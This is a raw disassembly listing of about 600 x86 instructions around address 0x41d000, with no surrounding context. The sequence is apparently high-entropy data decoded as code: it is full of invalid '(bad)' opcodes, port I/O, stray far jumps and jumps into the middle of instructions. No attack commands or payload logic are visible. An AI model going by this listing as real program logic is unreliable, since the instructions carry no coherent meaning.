  41cf19:	aas    
  41cf1a:	xchg   BYTE PTR [ebp-0x70],al
  41cf1d:	lds    edx,FWORD PTR [ebx-0x369f2a10]
  41cf23:	aam    0xd
  41cf25:	xor    al,0x56
  41cf27:	in     eax,dx
  41cf28:	sbb    DWORD PTR [esi*8-0x1e1500ad],ebp
  41cf2f:	and    bl,dl
  41cf31:	aas    
  41cf32:	popf   
  41cf33:	push   ebp
  41cf34:	arpl   WORD PTR [ecx-0x53],sp
  41cf37:	mov    ebp,0x745ef3d3
  41cf3c:	jp     0x41cf3f
  41cf3e:	out    dx,eax
  41cf3f:	test   eax,0x80d1fbf3
  41cf44:	pop    edi
  41cf45:	xlat   BYTE PTR ds:[ebx]
  41cf46:	int3   
  41cf47:	add    DWORD PTR [esi-0x716f8aa0],ebx
  41cf4d:	mov    ebx,DWORD PTR [eax]
  41cf4f:	pusha  
  41cf50:	dec    ecx
  41cf51:	sub    eax,0x60a62b21
  41cf56:	xchg   edx,eax
  41cf57:	jg     0x41cf54
  41cf59:	retw   0xf24e
  41cf5d:	pusha  
  41cf5e:	mov    BYTE PTR [esi],0x91
  41cf61:	rol    DWORD PTR [eax+eax*1+0x6c],1
  41cf65:	mov    esp,0xb2fab0ee
  41cf6a:	sub    eax,0x97781ecb
  41cf6f:	mov    eax,ds:0xe496e812
  41cf74:	mov    esp,0xc9c1e1f2
  41cf79:	test   al,0xe7
  41cf7b:	mov    al,ds:0x73b7d18d
  41cf80:	int    0x93
  41cf82:	retf   
  41cf83:	dec    ecx
  41cf84:	pop    esi
  41cf85:	in     eax,0xd6
  41cf87:	dec    ebx
  41cf88:	mov    dh,0x7e
  41cf8a:	ds jb  0x41cfc5
  41cf8d:	popa   
  41cf8e:	xor    BYTE PTR [ecx+eax*4],bl
  41cf91:	icebp  
  41cf92:	ror    DWORD PTR [edx],1
  41cf94:	retf   0xf75c
  41cf97:	inc    esp
  41cf98:	(bad)  
  41cf99:	loop   0x41cf89
  41cf9b:	xor    ch,BYTE PTR [esi-0x2e0e06f4]
  41cfa1:	pusha  
  41cfa2:	cli    
  41cfa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfa4:	pop    es
  41cfa5:	test   DWORD PTR [esp+edi*4+0xcf573cb],edi
  41cfac:	outs   dx,BYTE PTR ds:[esi]
  41cfad:	dec    esi
  41cfae:	in     eax,0x20
  41cfb0:	adc    edi,DWORD PTR [ecx+0x51be3bfd]
  41cfb6:	frstor [edx+0x2a]
  41cfb9:	out    0xab,al
  41cfbb:	fs jle 0x41cf92
  41cfbe:	ss xor dl,cl
  41cfc1:	push   cs
  41cfc2:	mov    dl,0xd7
  41cfc4:	jae    0x41d026
  41cfc6:	adc    DWORD PTR [esi],ebx
  41cfc8:	cdq    
  41cfc9:	(bad)  
  41cfca:	scas   eax,DWORD PTR es:[edi]
  41cfcb:	stos   DWORD PTR es:[edi],eax
  41cfcc:	xor    BYTE PTR [edx-0x5],dl
  41cfcf:	mov    bh,0x3b
  41cfd1:	dec    esp
  41cfd2:	push   cs
  41cfd3:	sbb    BYTE PTR [edx+0x5e5b9a3e],al
  41cfd9:	jmp    0xe2295c0a
  41cfde:	dec    esi
  41cfdf:	mov    bh,0x72
  41cfe1:	pop    ebp
  41cfe2:	stos   BYTE PTR es:[edi],al
  41cfe3:	in     al,dx
  41cfe4:	push   ecx
  41cfe5:	in     al,dx
  41cfe6:	add    DWORD PTR [esi],0xffffffb1
  41cfe9:	lahf   
  41cfea:	or     esi,DWORD PTR [eax+0x491aa46c]
  41cff0:	pop    esi
  41cff1:	mov    edi,0xf12c4af3
  41cff6:	xchg   ecx,eax
  41cff7:	dec    edx
  41cff8:	dec    eax
  41cff9:	icebp  
  41cffa:	mov    fs:0x739ba99c,al
  41d000:	fwait
  41d001:	(bad)  
  41d002:	outs   dx,DWORD PTR ds:[esi]
  41d003:	gs loope 0x41d035
  41d006:	or     al,dh
  41d008:	jmp    FWORD PTR [eax-0x12]
  41d00b:	arpl   WORD PTR [eax+0x71a2300b],sp
  41d011:	pusha  
  41d012:	pop    esp
  41d013:	test   al,0x19
  41d015:	shl    DWORD PTR [edi-0x119d640c],cl
  41d01b:	xchg   ecx,eax
  41d01c:	out    dx,eax
  41d01d:	lock mov eax,ds:0x9d4a4fe
  41d023:	mov    ebp,0xa13047fa
  41d028:	(bad)  
  41d029:	or     BYTE PTR [ebx],ch
  41d02b:	(bad)  
  41d02c:	mov    dh,0xad
  41d02e:	out    dx,al
  41d02f:	pop    es
  41d030:	dec    ecx
  41d031:	mov    ds:0xbdb381a2,eax
  41d036:	lods   al,BYTE PTR ds:[esi]
  41d037:	iret   
  41d038:	cdq    
  41d039:	clc    
  41d03a:	add    BYTE PTR [ecx-0x781d125e],ah
  41d040:	imul   edi,DWORD PTR [eax-0xae35f1d],0xfffffff4
  41d047:	scas   al,BYTE PTR es:[edi]
  41d048:	cwde   
  41d049:	inc    ebx
  41d04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04b:	aaa    
  41d04c:	pop    edi
  41d04d:	xchg   esp,eax
  41d04e:	pop    ebp
  41d04f:	mov    eax,0x82c422f6
  41d054:	das    
  41d055:	sar    ecx,0xa9
  41d058:	popa   
  41d059:	popa   
  41d05a:	xchg   edx,eax
  41d05b:	loop   0x41d09a
  41d05d:	lods   eax,DWORD PTR ds:[esi]
  41d05e:	in     eax,dx
  41d05f:	loopne 0x41d084
  41d061:	leave  
  41d062:	out    dx,al
  41d063:	aam    0x8d
  41d065:	jle    0x41d0c0
  41d067:	aas    
  41d068:	mov    bl,0x15
  41d06a:	jp     0x41d00d
  41d06c:	xor    BYTE PTR [edx+esi*4+0x1aa8e9bf],cl
  41d073:	and    al,0x5e
  41d075:	std    
  41d076:	ret    0x90a5
  41d079:	ret    
  41d07a:	sub    eax,0xb544a599
  41d07f:	repz mov bh,0x1f
  41d082:	cmp    ch,ah
  41d084:	mov    ebx,0x8bb138b9
  41d089:	jg     0x41d079
  41d08b:	sbb    esp,esp
  41d08d:	xor    al,0xc5
  41d08f:	ds std 
  41d091:	adc    al,0x80
  41d093:	test   al,0xb4
  41d095:	(bad)  
  41d096:	fmul   st(2),st
  41d098:	jp     0x41d0ea
  41d09a:	add    eax,DWORD PTR ss:[edx-0x43df11d8]
  41d0a1:	xchg   DWORD PTR [edx+0x60],ebp
  41d0a4:	jbe    0x41d076
  41d0a6:	mov    ah,0xa0
  41d0a8:	xchg   di,ax
  41d0aa:	cld    
  41d0ab:	xchg   cl,bl
  41d0ad:	cmp    dl,ch
  41d0af:	sub    ebx,DWORD PTR [esi+0x7b]
  41d0b2:	in     al,0xb9
  41d0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b5:	mov    edi,0x6101e7ca
  41d0ba:	and    edi,edx
  41d0bc:	or     al,BYTE PTR [ebp-0x274edbb1]
  41d0c2:	out    dx,eax
  41d0c3:	mov    esi,0xa6ef491c
  41d0c8:	dec    eax
  41d0c9:	imul   ecx,eax,0xe10734a0
  41d0cf:	fldenv [edx+0x54f08a5d]
  41d0d5:	lods   al,BYTE PTR ds:[esi]
  41d0d6:	xchg   DWORD PTR [esi],esp
  41d0d8:	in     al,0x46
  41d0da:	or     ecx,esp
  41d0dc:	xchg   ecx,eax
  41d0dd:	std    
  41d0de:	test   DWORD PTR [ebx+0x55],eax
  41d0e1:	pop    esi
  41d0e2:	bound  ecx,QWORD PTR [edi-0x1ba82368]
  41d0e8:	xchg   BYTE PTR ds:0x1a5e3f5e,dh
  41d0ee:	sbb    al,BYTE PTR [edi]
  41d0f0:	cmp    dh,BYTE PTR [edx]
  41d0f2:	or     eax,ebx
  41d0f4:	xor    bl,BYTE PTR [edx-0xf]
  41d0f7:	dec    edx
  41d0f8:	pop    esp
  41d0f9:	or     DWORD PTR [eax-0x6f],edx
  41d0fc:	sbb    cl,cl
  41d0fe:	cmp    DWORD PTR [edx+0x17],0x3605a24e
  41d105:	mov    bh,0xee
  41d107:	sbb    BYTE PTR [esi-0x3c0fbf41],bl
  41d10d:	into   
  41d10e:	mov    dh,0xb8
  41d110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d111:	pusha  
  41d112:	and    ch,ah
  41d114:	lock cwde 
  41d116:	cmp    cl,BYTE PTR [esi*2-0x6c85f8a0]
  41d11d:	jl     0x41d162
  41d11f:	loop   0x41d14b
  41d121:	mov    esp,0x111f66ee
  41d126:	cmp    esi,DWORD PTR [eax]
  41d128:	inc    esi
  41d129:	push   ecx
  41d12a:	adc    eax,0x269c61a1
  41d12f:	push   cs
  41d130:	pusha  
  41d131:	out    0x8c,al
  41d133:	loope  0x41d193
  41d135:	iret   
  41d136:	aas    
  41d137:	(bad)  
  41d138:	cmp    eax,edx
  41d13a:	push   ds
  41d13b:	sar    DWORD PTR [esi-0x710380a0],0x16
  41d142:	daa    
  41d143:	cmp    al,0x40
  41d145:	daa    
  41d146:	out    dx,al
  41d147:	pop    ecx
  41d148:	xor    DWORD PTR [esp+edi*1],eax
  41d14b:	retf   0x8567
  41d14e:	mov    bh,0xa7
  41d150:	mov    al,ds:0xcdc86430
  41d155:	and    BYTE PTR [eax],0x20
  41d158:	and    al,0x18
  41d15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d15b:	in     al,dx
  41d15c:	pop    esi
  41d15d:	add    BYTE PTR [eax-0xc],ch
  41d160:	xor    DWORD PTR [ebx+0x5e],0x50aaad72
  41d167:	pushf  
  41d168:	jmp    0x3199:0xde782984
  41d16f:	daa    
  41d170:	int3   
  41d171:	repnz inc eax
  41d174:	ficomp DWORD PTR [eax]
  41d176:	outs   dx,BYTE PTR ds:[esi]
  41d177:	add    BYTE PTR [edx],cl
  41d179:	xchg   dh,dl
  41d17b:	push   cs
  41d17c:	lahf   
  41d17d:	inc    ebx
  41d17e:	mov    ecx,esp
  41d180:	mov    ah,al
  41d182:	ret    
  41d183:	sub    dl,0xf8
  41d186:	dec    ecx
  41d187:	sbb    BYTE PTR [esi+0x50],0x30
  41d18b:	sbb    DWORD PTR ds:0xf8dda583,eax
  41d191:	pusha  
  41d192:	adc    DWORD PTR [edx+0xe],ebx
  41d195:	call   0x5a61:0xa69d252b
  41d19c:	jle    0x41d126
  41d19e:	iret   
  41d19f:	mov    esi,0xb9ee7084
  41d1a4:	fnstcw WORD PTR [ecx]
  41d1a6:	fadd   DWORD PTR ds:0xa84ff16e
  41d1ac:	mov    al,0x9
  41d1ae:	or     al,0xfb
  41d1b0:	bound  esi,QWORD PTR [ecx-0x33aedddd]
  41d1b6:	out    dx,al
  41d1b7:	jno    0x41d14c
  41d1b9:	push   eax
  41d1ba:	jmp    0x31a1:0x448c4768
  41d1c1:	fnsave [ecx-0x70]
  41d1c4:	ret    
  41d1c5:	stos   BYTE PTR es:[edi],al
  41d1c6:	add    al,0xb6
  41d1c8:	pop    esi
  41d1c9:	add    ebx,esp
  41d1cb:	adc    cl,BYTE PTR [edi]
  41d1cd:	retf   
  41d1ce:	not    BYTE PTR [ecx]
  41d1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1d1:	pop    ecx
  41d1d2:	dec    esp
  41d1d3:	lods   eax,DWORD PTR ds:[esi]
  41d1d4:	sub    BYTE PTR [edx-0x3a],dl
  41d1d7:	pusha  
  41d1d8:	mov    esi,0x5ef044b7
  41d1dd:	test   eax,0x393b2fa3
  41d1e2:	psubb  mm0,QWORD PTR [ecx+0x33a03f60]
  41d1e9:	(bad)  
  41d1ea:	mov    ebp,0xeed59256
  41d1ef:	gs pop esp
  41d1f1:	xor    eax,0x3b3ffdb6
  41d1f6:	and    DWORD PTR [ecx-0x55b31e78],0xffffffc8
  41d1fd:	xorps  xmm0,XMMWORD PTR [ebp+0x5d]
  41d201:	retf   
  41d202:	cmc    
  41d203:	lods   al,BYTE PTR ds:[esi]
  41d204:	jmp    0x41d1d4
  41d206:	cdq    
  41d207:	mov    cl,0x82
  41d209:	xchg   esp,eax
  41d20a:	push   eax
  41d20b:	mov    eax,ds:0xb9dc53df
  41d210:	and    DWORD PTR [ecx],eax
  41d212:	sub    edi,ecx
  41d214:	dec    esp
  41d215:	repz or eax,0xa71153f9
  41d21b:	dec    ecx
  41d21c:	mov    ecx,0xb6e12069
  41d221:	and    al,0x80
  41d223:	out    0xb2,eax
  41d225:	pusha  
  41d226:	ret    0x7069
  41d229:	mov    bl,0x2f
  41d22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d22c:	in     al,0xde
  41d22e:	ficom  WORD PTR [ebp-0x2c4049a3]
  41d234:	xchg   ecx,eax
  41d235:	addr16 int 0x3c
  41d238:	xchg   edx,eax
  41d239:	fcmovnb st,st(6)
  41d23b:	xchg   edi,eax
  41d23c:	sti    
  41d23d:	clc    
  41d23e:	add    DWORD PTR [esi-0x36249f34],ecx
  41d244:	mov    bl,0x26
  41d246:	jmp    FWORD PTR [edx]
  41d248:	clc    
  41d249:	lods   eax,DWORD PTR ds:[esi]
  41d24a:	out    dx,al
  41d24b:	inc    edx
  41d24c:	ja     0x41d205
  41d24e:	test   bh,dl
  41d250:	les    ebp,FWORD PTR [ecx-0xa5eb4]
  41d256:	sahf   
  41d257:	rcl    BYTE PTR [edi+0x5e123370],cl
  41d25d:	js     0x41d2c7
  41d25f:	std    
  41d260:	or     ch,BYTE PTR [ebx+0x61118d0a]
  41d266:	jbe    0x41d235
  41d268:	stos   BYTE PTR es:[edi],al
  41d269:	jne    0x41d20e
  41d26b:	(bad)  
  41d26c:	mov    DWORD PTR [ecx-0x3cf5119],esi
  41d272:	clc    
  41d273:	or     DWORD PTR [edi+0x37],0xf6693d
  41d27a:	lods   eax,DWORD PTR ds:[esi]
  41d27b:	mov    eax,ds:0xdca61ae3
  41d280:	jmp    0x13a:0x6d593b38
  41d287:	xor    al,bl
  41d289:	mov    WORD PTR [esi],gs
  41d28b:	dec    esp
  41d28c:	or     al,0x4a
  41d28e:	ds xchg esi,eax
  41d290:	sub    DWORD PTR [edx-0x16],eax
  41d293:	jmp    0x445ff3b1
  41d298:	jge    0x41d314
  41d29a:	scas   eax,DWORD PTR es:[edi]
  41d29b:	cmp    BYTE PTR [ecx-0x6c],dl
  41d29e:	sbb    BYTE PTR [esi],bl
  41d2a0:	loopne 0x41d253
  41d2a2:	sti    
  41d2a3:	(bad)  [edi-0x60]
  41d2a6:	mov    al,0x2f
  41d2a8:	cld    
  41d2a9:	adc    bh,dl
  41d2ab:	pop    ds
  41d2ac:	cdq    
  41d2ad:	pusha  
  41d2ae:	xchg   dl,cl
  41d2b0:	xor    al,0xfe
  41d2b2:	dec    esi
  41d2b3:	out    dx,eax
  41d2b4:	adc    DWORD PTR [ebx],eax
  41d2b6:	out    dx,al
  41d2b7:	mov    ch,0x10
  41d2b9:	out    0xde,eax
  41d2bb:	enter  0x6ff,0x2e
  41d2bf:	call   0x585b:0x826311c5
  41d2c6:	mov    ah,BYTE PTR [ecx+0x28]
  41d2c9:	dec    ebp
  41d2ca:	fistp  QWORD PTR [ecx+0x1274bb5e]
  41d2d0:	cmp    eax,0xa1b50bbe
  41d2d5:	dec    eax
  41d2d6:	ds ret 
  41d2d8:	push   edi
  41d2d9:	outs   dx,DWORD PTR ds:[esi]
  41d2da:	lock call DWORD PTR [edx-0x7]
  41d2de:	scas   eax,DWORD PTR es:[edi]
  41d2df:	and    al,0xe3
  41d2e1:	and    dl,al
  41d2e3:	pop    ebx
  41d2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2e5:	(bad)  
  41d2e7:	inc    ebx
  41d2e8:	or     al,0x44
  41d2ea:	pop    edi
  41d2eb:	cmp    DWORD PTR [edi-0x17],edi
  41d2ee:	in     eax,dx
  41d2ef:	mov    al,ds:0x8b9550f1
  41d2f4:	retf   0xc6b6
  41d2f7:	out    0x37,al
  41d2f9:	push   esi
  41d2fa:	retf   
  41d2fb:	and    al,cl
  41d2fd:	(bad)  
  41d2fe:	iret   
  41d2ff:	(bad)  
  41d300:	aaa    
  41d301:	pop    edi
  41d302:	ins    BYTE PTR es:[edi],dx
  41d303:	mov    eax,ds:0x77618fda
  41d308:	stos   BYTE PTR es:[edi],al
  41d309:	mov    cl,0x82
  41d30b:	jmp    0xa1e6c848
  41d310:	dec    BYTE PTR [eax+0x5]
  41d313:	jae    0x41d2de
  41d315:	lods   al,BYTE PTR ds:[esi]
  41d316:	je     0x41d2b8
  41d318:	lock push 0xffffffb4
  41d31b:	loope  0x41d31b
  41d31d:	and    bh,0xa3
  41d320:	xchg   ebp,eax
  41d321:	pushw  es
  41d323:	mov    al,gs:0x1f2eb413
  41d329:	popa   
  41d32a:	fnstcw WORD PTR [eax+eiz*2-0x70f377d1]
  41d331:	inc    eax
  41d332:	out    dx,al
  41d333:	je     0x41d362
  41d335:	ss addr16 mov eax,0xa1698f46
  41d33c:	mov    dl,0xb5
  41d33e:	ds pusha 
  41d340:	dec    eax
  41d341:	pop    ecx
  41d342:	mov    ebp,0xeef686f3
  41d347:	mov    ch,0xc2
  41d349:	cmc    
  41d34a:	jge    0x41d3cb
  41d34c:	mov    edi,0xa7a0e333
  41d351:	xor    al,0x26
  41d353:	bound  ecx,QWORD PTR [esi]
  41d355:	enter  0x3611,0x64
  41d359:	fld    QWORD PTR [edi-0x28]
  41d35c:	loopne 0x41d37b
  41d35e:	or     al,BYTE PTR [edx+0xc9ce0e6]
  41d364:	inc    edi
  41d365:	popa   
  41d366:	pop    es
  41d367:	loope  0x41d38e
  41d369:	sbb    al,0x9a
  41d36b:	pop    edx
  41d36c:	enter  0xec1a,0x2
  41d370:	daa    
  41d371:	cmp    esp,edi
  41d373:	mov    ch,0xce
  41d375:	mov    al,ds:0x6092cc45
  41d37a:	mov    ecx,0x9118710d
  41d37f:	cmp    al,0xa9
  41d381:	popa   
  41d382:	out    0xdf,eax
  41d384:	jle    0x41d310
  41d386:	pushf  
  41d387:	sbb    BYTE PTR [esi-0x136d2ac],bl
  41d38d:	pusha  
  41d38e:	pop    ebp
  41d38f:	push   ecx
  41d390:	sub    al,BYTE PTR [esi+eiz*4-0x4]
  41d394:	pop    ebp
  41d395:	fs push esi
  41d397:	pop    es
  41d398:	inc    esi
  41d399:	test   DWORD PTR [edi+0x46],ebp
  41d39c:	pop    ebp
  41d39d:	dec    esi
  41d39e:	dec    esp
  41d39f:	and    al,0xa5
  41d3a1:	in     eax,0xd1
  41d3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3a4:	jle    0x41d417
  41d3a6:	pop    eax
  41d3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3a8:	or     ah,BYTE PTR [eax-0x7700670f]
  41d3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3af:	out    dx,eax
  41d3b0:	icebp  
  41d3b1:	sub    al,BYTE PTR [eax]
  41d3b3:	lock (bad) 
  41d3b5:	shr    BYTE PTR [esi+0x6c1cf8f1],0xac
  41d3bc:	push   ebx
  41d3bd:	popa   
  41d3be:	cmp    ebx,ebx
  41d3c0:	or     eax,0x41101f0b
  41d3c5:	add    edi,ebp
  41d3c7:	mov    cl,0xab
  41d3c9:	test   DWORD PTR [edx],0xd27fc9ad
  41d3cf:	mov    al,ds:0xaaabda05
  41d3d4:	mov    cl,0xc1
  41d3d6:	xchg   esp,eax
  41d3d7:	or     ebx,DWORD PTR [esi+0x62]
  41d3da:	xchg   ebp,ecx
  41d3dc:	aam    0xfe
  41d3de:	inc    ebx
  41d3df:	inc    edi
  41d3e0:	out    dx,al
  41d3e1:	pusha  
  41d3e2:	push   ss
  41d3e3:	push   0x11
  41d3e5:	out    0xa9,eax
  41d3e7:	or     BYTE PTR [ecx],cl
  41d3e9:	mov    ah,0xee
  41d3eb:	popf   
  41d3ec:	ins    BYTE PTR es:[edi],dx
  41d3ed:	in     eax,dx
  41d3ee:	in     eax,0xb5
  41d3f0:	pop    esp
  41d3f1:	retf   0xa7f7
  41d3f4:	(bad)  
  41d3f7:	das    
  41d3f8:	push   ss
  41d3f9:	loope  0x41d41a
  41d3fb:	lods   eax,DWORD PTR ds:[esi]
  41d3fc:	div    DWORD PTR [eax+0x58]
  41d3ff:	mov    eax,0x220ad133
  41d404:	xor    DWORD PTR [edi-0xe],ecx
  41d407:	in     al,dx
  41d408:	aas    
  41d409:	in     al,0x36
  41d40b:	inc    eax
  41d40c:	mov    ss,WORD PTR [edx+0x23]
  41d40f:	xchg   edi,eax
  41d410:	mov    ch,0x95
  41d412:	push   cs
  41d413:	adc    eax,0xb82e73e0
  41d418:	pop    esi
  41d419:	jbe    0x41d3e9
  41d41b:	popa   
  41d41c:	dec    edi
  41d41d:	xor    BYTE PTR [esi],bl
  41d41f:	mov    ch,0xe2
  41d421:	cs adc al,0xa1
  41d424:	imul   edi,DWORD PTR [edx-0x6f982076],0x635edd52
  41d42e:	mov    dh,0xed
  41d430:	cmp    al,0xcb
  41d432:	arpl   WORD PTR ds:0xa10c2821,ax
  41d438:	ss pushf 
  41d43a:	dec    esi
  41d43b:	cs jb  0x41d449
  41d43e:	mov    al,ds:0xc1f85ee6
  41d443:	xor    eax,0x3bb7576e
  41d448:	mov    eax,ds:0x6e27360
  41d44d:	jno    0x41d4a1
  41d44f:	push   es
  41d450:	pop    ebp
  41d451:	int    0x7f
  41d453:	mov    eax,ds:0x6e8e353f
  41d458:	mov    ds:0xadef0860,al
  41d45d:	push   ebx
  41d45e:	repnz xchg esi,eax
  41d460:	jae    0x41d499
  41d462:	out    dx,al
  41d463:	sub    bl,bh
  41d465:	test   eax,0x95b889ef
  41d46a:	hlt    
  41d46b:	mov    al,ds:0xb71e0f3f
  41d470:	push   0xffffffde
  41d472:	dec    esi
  41d473:	stos   DWORD PTR es:[edi],eax
  41d474:	adc    ecx,DWORD PTR es:[esi]
  41d477:	mov    eax,ds:0x379e8fc8
  41d47c:	xchg   ebp,eax
  41d47d:	xor    al,0x8f
  41d47f:	stos   DWORD PTR es:[edi],eax
  41d480:	pop    ebp
  41d481:	push   esi
  41d482:	outs   dx,BYTE PTR ds:[esi]
  41d483:	jnp    0x41d4ee
  41d485:	jmp    edi
  41d487:	fidiv  DWORD PTR [edx]
  41d489:	xchg   ebx,eax
  41d48a:	out    dx,al
  41d48b:	push   es
  41d48c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d48d:	mov    eax,ds:0x5b177f11
  41d492:	test   DWORD PTR [esi+0x3c6ed695],ebp
  41d498:	dec    ebx
  41d499:	out    0xe9,eax
  41d49b:	xchg   ebx,eax
  41d49c:	push   ecx
  41d49d:	ret    
  41d49e:	out    dx,al
  41d49f:	xor    dl,BYTE PTR [edx+0x74372b83]
  41d4a5:	jle    0x41d45b
  41d4a7:	mov    al,ds:0xf000caff
  41d4ac:	push   0x5a204c60
  41d4b1:	jle    0x41d491
  41d4b3:	mov    bh,0xd3
  41d4b5:	(bad)  
  41d4b6:	imul   esp,DWORD PTR [ebx],0x5f
  41d4b9:	shl    DWORD PTR ds:0x96566756,1
  41d4bf:	shl    ch,cl
  41d4c1:	in     eax,0xb7
  41d4c3:	and    ah,cl
  41d4c5:	iret   
  41d4c6:	add    ah,BYTE PTR [edi+0x2b42612b]
  41d4cc:	(bad)  
  41d4cd:	aad    0x15
  41d4cf:	jmp    0x682f0456
  41d4d4:	enter  0x351c,0x7c
  41d4d8:	pop    edi
  41d4d9:	dec    esi
  41d4da:	pop    esi
  41d4db:	into   
  41d4dc:	push   ss
  41d4dd:	jae    0x41d50d
  41d4df:	nop
  41d4e0:	repnz pop edi
  41d4e2:	pop    edx
  41d4e3:	dec    esp
  41d4e4:	(bad)  
  41d4e5:	out    0xac,eax
  41d4e7:	lock rcr DWORD PTR [edx],cl
  41d4ea:	out    dx,eax
  41d4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ec:	dec    esi
  41d4ed:	cmp    ebp,ebp
  41d4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4f0:	sbb    ch,BYTE PTR [ebx-0x56aa1092]
  41d4f6:	push   ds
  41d4f7:	or     DWORD PTR [ebx+0x61],ecx
  41d4fa:	pop    ss
  41d4fb:	pop    ecx
  41d4fc:	loop   0x41d53b
  41d4fe:	loope  0x41d566
  41d500:	(bad)  
  41d501:	sub    al,0xf7
  41d503:	and    BYTE PTR [edi-0x6c2a00ac],cl
  41d509:	xchg   edx,eax
  41d50a:	outs   dx,BYTE PTR ds:[esi]
  41d50b:	nop
  41d50c:	cli    
  41d50d:	retf   0x7d41
  41d510:	call   0x991c:0xd06e1941
  41d517:	mov    ebx,0x3df8e0da
  41d51c:	adc    al,0xe4
  41d51e:	push   esp
  41d51f:	stos   DWORD PTR es:[edi],eax
  41d520:	pop    ebx
  41d521:	loop   0x41d4b5
  41d523:	sub    ch,0x8e
  41d526:	cmp    eax,0x6242c88a
  41d52b:	push   0xd
  41d52d:	push   edx
  41d52e:	add    eax,DWORD PTR [esi]
  41d530:	and    BYTE PTR [edi-0x33899a92],dl
  41d536:	cli    
  41d537:	repz pop esi
  41d539:	jle    0x41d59b
  41d53b:	jl     0x41d4d9
  41d53d:	jmp    0x23a8:0x62d95405
  41d544:	fimul  WORD PTR [ecx+0x57602de0]
  41d54a:	scas   al,BYTE PTR es:[edi]
  41d54b:	mov    ah,0x37
  41d54d:	add    BYTE PTR [eax-0x71],dh
  41d550:	sub    esi,DWORD PTR [ebp+0x2e]
  41d553:	sbb    ah,BYTE PTR [ebx]
  41d555:	xchg   ebx,eax
  41d556:	xor    eax,0xcf5f90aa
  41d55b:	jae    0x41d5d3
  41d55d:	and    al,0xc2
  41d55f:	test   DWORD PTR [esi+0x41],esp
  41d562:	jnp    0x41d583
  41d564:	pop    esi
  41d565:	mov    bl,0xa5
  41d567:	pusha  
  41d568:	loope  0x41d550
  41d56a:	adc    DWORD PTR [edi],esp
  41d56c:	dec    ecx
  41d56d:	imul   eax,DWORD PTR [esi-0x4d8ea18c],0xd2dcc697
  41d577:	cs pop edi
  41d579:	ss jge 0x41d5c1
  41d57c:	sbb    al,0xe0
  41d57e:	js     0x41d5fa
  41d580:	jns    0x41d51d
  41d582:	fidivr WORD PTR [esi]
  41d584:	and    al,0x61
  41d586:	inc    eax
  41d587:	add    al,BYTE PTR [edx+0x4b]
  41d58a:	mov    dl,0x93
  41d58c:	xchg   DWORD PTR [esi+ebp*8+0x35],edx
  41d590:	sbb    al,0xe6
  41d592:	out    0xff,eax
  41d594:	mov    bl,0xa1
  41d596:	bound  esp,QWORD PTR [eax+ebx*8+0x59370235]
  41d59d:	mov    edi,0x306bff9e
  41d5a2:	(bad)  
  41d5a3:	xlat   BYTE PTR ds:[ebx]
  41d5a4:	mov    cl,0x60
  41d5a6:	sbb    BYTE PTR [ebp+0x1e707ecf],bl
  41d5ac:	cdq    
  41d5ad:	es inc ebx
  41d5af:	mov    eax,ds:0x3e0da334
  41d5b4:	inc    esp
  41d5b5:	es mov esi,0xec185e03
  41d5bb:	adc    al,0x3
  41d5bd:	sahf   
  41d5be:	icebp  
  41d5bf:	mov    ecx,0xac142ee
  41d5c4:	push   ebx
  41d5c5:	adc    edi,DWORD PTR [eax+ebx*2]
  41d5c8:	ds pop es
  41d5ca:	(bad)  
  41d5cb:	sub    al,0x65
  41d5cd:	mov    ebx,0xde49ab23
  41d5d2:	repnz mov al,0x9
  41d5d5:	outs   dx,BYTE PTR ds:[esi]
  41d5d6:	idiv   DWORD PTR [ecx]
  41d5d8:	jne    0x41d569
  41d5da:	ss ins BYTE PTR es:[edi],dx
  41d5dc:	mov    dh,0x67
  41d5de:	cmp    BYTE PTR [ebp-0x22],ah
  41d5e1:	fadd   QWORD PTR [ecx-0x395df4c8]
  41d5e7:	mov    bh,0x46
  41d5e9:	lahf   
  41d5ea:	sub    esp,DWORD PTR [ebx+0x5e]
  41d5ed:	jb     0x41d620
  41d5ef:	out    0x46,eax
  41d5f1:	hlt    
  41d5f2:	(bad)  
  41d5f3:	fs jle 0x41d653
  41d5f6:	rcr    DWORD PTR [edx],cl
  41d5f8:	icebp  
  41d5f9:	or     bh,BYTE PTR [edi-0x1b]
  41d5fc:	mov    ds:0x5f89f0e0,eax
  41d601:	mov    cl,0xee
  41d603:	gs xor edi,eax
  41d606:	inc    esp
  41d607:	stc    
  41d608:	mov    ch,0x82
  41d60b:	mov    eax,ds:0xaa2a1e9c
  41d610:	stos   BYTE PTR es:[edi],al
  41d611:	sub    al,0xab
  41d613:	test   al,0x5e
  41d615:	leave  
  41d616:	fmul   DWORD PTR [ebx+0x39]
  41d619:	jmp    0x614370fb
  41d61e:	adc    eax,DWORD PTR [ecx+0x48]
  41d621:	rol    BYTE PTR [edx],0xd7
  41d624:	mov    edi,0x6590e743
  41d629:	fcomp  DWORD PTR [ebp+ecx*1-0x3c0e57a2]
  41d630:	lods   al,BYTE PTR ds:[esi]
  41d631:	pusha  
  41d632:	or     al,0x16
  41d634:	adc    ch,BYTE PTR [edi-0x6c]
  41d637:	mov    esi,0xf9f04ba2
  41d63c:	fs pop edx
  41d63e:	sub    al,0x21
  41d640:	xor    DWORD PTR [esi+0x5352584b],esp
  41d646:	cli    
  41d647:	rol    BYTE PTR [esi+0x30254e73],0x86
  41d64e:	repz pusha 
  41d650:	add    BYTE PTR [edx],0xee
  41d653:	push   0x8eea7479
  41d658:	outs   dx,BYTE PTR ds:[esi]
  41d659:	lock cmc 
  41d65b:	mov    al,ds:0xaf98896f
  41d660:	push   ebp
  41d661:	xor    al,0xfd
  41d663:	pop    ss
  41d664:	push   edx
  41d665:	jno    0x41d678
  41d667:	sbb    al,0x20
